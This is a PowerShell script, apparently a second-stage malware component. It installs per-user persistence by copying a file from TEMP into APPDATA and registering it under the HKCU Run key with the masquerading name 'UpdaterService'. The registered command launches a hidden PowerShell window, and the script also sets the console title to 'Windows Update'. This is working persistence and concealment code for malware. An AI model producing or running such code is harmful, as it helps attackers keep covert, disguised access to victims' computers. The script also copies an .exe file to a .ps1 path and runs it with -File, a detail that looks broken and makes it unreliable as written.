
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'UpdaterService',
    [string]$PersistencePath = "$env:APPDATA\updater.ps1"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "$env:TEMP\svcupdate.exe" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $PersistencePath + '"') -PropertyType String -Force
$FetchResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $FetchResult.$RegistryValue)

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "stage marker 33 reached"
